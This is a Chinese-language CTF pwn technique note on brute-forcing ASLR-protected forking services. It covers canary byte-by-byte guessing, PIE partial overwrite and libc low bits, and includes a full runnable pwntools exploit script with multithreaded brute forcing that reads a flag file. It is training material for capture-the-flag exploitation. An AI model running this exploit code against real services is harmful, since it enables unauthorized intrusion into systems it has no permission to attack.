---
title: ASLR 爆破技巧（canary / PIE / libc 低位）
category: pwn
tags: [ASLR, 爆破, brute force, fork, 部分覆盖]
signals: [服务每次连接都崩溃但不重启, "nc 连上后进程 fork 出来", 只能部分覆盖地址, 低12位固定, 题目提示多试几次]
difficulty: medium
source: "CTF-Wiki 花式栈溢出 / ir0nstone ASLR / HackTricks"
tools: [pwntools, socat, gdb]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题面写「服务由 xinetd/socat 启动，每个连接 fork 一个进程」——爆破的首要前提。
- 只能覆盖返回地址低 1~2 字节（PIE 部分覆盖），成功率本身不是 100%。
- canary 未知，但服务是 fork 模式，父进程 canary 固定。
- 程序里 `read` 长度不足以泄露，却要求准确地址。
- 本地 `process()` 每次地址都变，但远端多次连接后偶尔成功——典型 ASLR 爆破场景。

## 二、原理

ASLR 只随机化**页级基址**，页内低 12 位不变。可爆破的维度：

| 目标 | 随机位数 | 爆破次数期望 | 前提 |
|---|---|---|---|
| Canary（逐字节） | 7 字节 × 8 bit | 8 × 128 ≈ 1024 次 | fork 复用 |
| PIE 返回地址低 12 位 | 3~4 bit（只改 1.5 字节） | 16 次 | 目标同页 |
| PIE 返回地址低 16 位 | 4 bit（nibble 随机） | 16~256 次 | 目标同 64K 页 |
| libc 基址低 12 位后的 nibble | 1~4 bit | 16 次 | 只能部分覆盖 libc 地址 |
| 32 位栈地址低位 | 约 8~12 bit | 256~4096 次 | 无 NX，shellcode |

关键约束：
- **fork 才能爆破**：子进程继承父进程 ASLR 结果；若是 `exec` 重启，则每次重随机，无法爆破。
- **失败不能让服务整体退出**：`xinetd`/`socat fork` 下子进程崩了不影响下一次。
- **超时控制**：`recv(timeout=0.1~0.5)`，串行爆破 1000 次约需数分钟，可开多进程加速。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: found  NX: enabled  PIE: enabled
```

决策：

1. 先确认 fork：本地用题目给的 `run.sh`/`docker-compose` 看是否 `socat TCP-LISTEN:9999,fork,reuseaddr`。
2. **canary 爆破** → 逐字节，每字节最多 256 次，遇到进程存活即命中。
3. **PIE 部分覆盖爆破** → 每次只改低 2 字节，`p16(target & 0xffff)`，循环直到收到 shell/flag。
4. **libc 低位爆破** → 仅当目标地址与已知地址只差低位时可行（如 `one_gadget` 的 `rsp` 约束）。
5. **多线程加速**：每个线程独立 `remote()`。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed

context.binary = elf = ELF("./pwn")
context.log_level = "warn"

HOST, PORT = args.HOST or "TARGET", int(args.PORT or 1337)
OFFSET     = 0x40                      # buf 到 canary 的偏移（占位）
TARGET_LOW = 0x11b8                    # 目标函数低 2 字节（占位）

def conn():
    return remote(HOST, PORT, timeout=3) if not args.LOCAL else process()

# ---------- 1) 逐字节爆破 canary ----------
def brute_canary(verbose=True):
    canary = b""
    while len(canary) < 8:
        hit = None
        for guess in range(0x100):
            if not canary and guess != 0x00:
                continue                       # 首字节恒为 0x00
            try:
                p = conn()
                payload = b"A" * OFFSET + canary + bytes([guess])
                p.send(payload)
                data = p.recv(timeout=0.6)
                p.close()
            except (EOFError, PwnlibException, OSError):
                continue
            # 判定：进程没有立刻报 stack smashing 且回显/仍然存活
            if data is not None and b"stack smashing" not in data \
               and b"***" not in data:
                hit = guess
                break
        if hit is None:
            log.failure(f"第 {len(canary)} 字节爆破失败（确认服务是否真的 fork）")
            return None
        canary += bytes([hit])
        if verbose:
            log.success(f"canary[{len(canary)-1}] = {hit:#04x}  -> {canary.hex()}")
    return canary

# ---------- 2) PIE 部分覆盖爆破 ----------
def brute_partial_overwrite(n=256):
    for i in range(n):
        try:
            p = conn()
            payload  = b"A" * OFFSET
            payload += p16(TARGET_LOW)         # 只覆盖低 2 字节
            p.send(payload)
            p.sendline(b"cat /flag\x00")
            data = p.recv(timeout=1.0)
            if b"flag{" in data or b"ctf{" in data.lower():
                success(f"命中，第 {i+1} 次")
                return p, data
            p.close()
        except (EOFError, OSError, PwnlibException):
            pass
    log.failure("部分覆盖爆破未命中")
    return None, None

# ---------- 3) 多线程并发爆破（加速） ----------
def parallel_brute(job_fn, workers=16, total=512):
    """job_fn(i) -> (p, data) 或 None"""
    result = None
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(job_fn, i): i for i in range(total)}
        for f in as_completed(futs):
            try:
                r = f.result()
            except Exception:
                continue
            if r:
                result = r
                for x in futs:
                    x.cancel()
                break
    return result

def single_try(i):
    try:
        p = conn()
        p.send(b"A" * OFFSET + p16(TARGET_LOW))
        p.sendline(b"cat /flag")
        d = p.recv(timeout=1.0)
        if b"{" in d:
            return p, d
        p.close()
    except Exception:
        pass
    return None

# ---------- 4) 带 canary 的部分覆盖（canary 已知后） ----------
def brute_with_canary(canary):
    for i in range(256):
        try:
            p = conn()
            payload  = b"A" * OFFSET + canary
            payload += b"B" * 8                    # saved rbp
            payload += p16(TARGET_LOW)
            p.send(payload)
            p.sendline(b"cat /flag")
            d = p.recv(timeout=1.0)
            if b"{" in d:
                return p, d
            p.close()
        except Exception:
            continue
    return None, None

if __name__ == "__main__":
    if args.CANARY:
        c = brute_canary()
        log.info(f"canary = {c.hex() if c else None}")
    elif args.PARALLEL:
        p, d = parallel_brute(single_try) or (None, None)
        if d:
            success(d.decode(errors="ignore"))
            p.interactive()
    else:
        p, d = brute_partial_overwrite()
        if d:
            success(d.decode(errors="ignore"))
            p.interactive()
```

加速 due 实战技巧：把 `send` + `recv` 拆开，用 `sendmany` 一次性发多个尝试；但更稳的是多线程独立连接。

## 五、常见坑 / 变体

- **服务不是 fork**：`socat ... exec:./pwn` 每次都会 reap，ASLR 重新随机，爆破失效。换成 `fork` 测试：`socat TCP-LISTEN:9999,fork,reuseaddr EXEC:./pwn`。
- **失败判定误判**：`recv` 超时返回 `b''` 与崩溃 EOF 不易区分，用「是否收到预期 banner / 是否继续可交互」双条件。
- **`try/except` 吞掉真实异常**：调试阶段先单线程 `context.log_level='debug'` 跑 3 次确认逻辑。
- **`p16` 覆盖有 4 位随机**：`0x1000 * k` 的高 nibble 来自 ASLR，1.5 字节技巧可降到 `1/16`。
- **远端限速**：部分赛事对单 IP 连接数限流，开 16 线程可能被 ban，先用 `pwn` 的 `sleep` 限速。
- **爆破 canary 时 `read` 需精确长度**：用 `send` 而非 `sendline`，否则多发一个 `\n` 改变判定。

## 六、参考来源

- [CTF-Wiki: 花式栈溢出技巧（爆破）](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/)
- [CTF-Wiki: Canary 爆破](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/)
- [ir0nstone: ASLR](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr)
- [ir0nstone: Forking Processes（fork 与 canary）](https://ir0nstone.gitbook.io/notes/binexp/stack/forking-processes)
- [HackTricks: Common Binary Protections](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [pwntools: 远程交互与超时](https://docs.pwntools.com/en/stable/tubes.html)
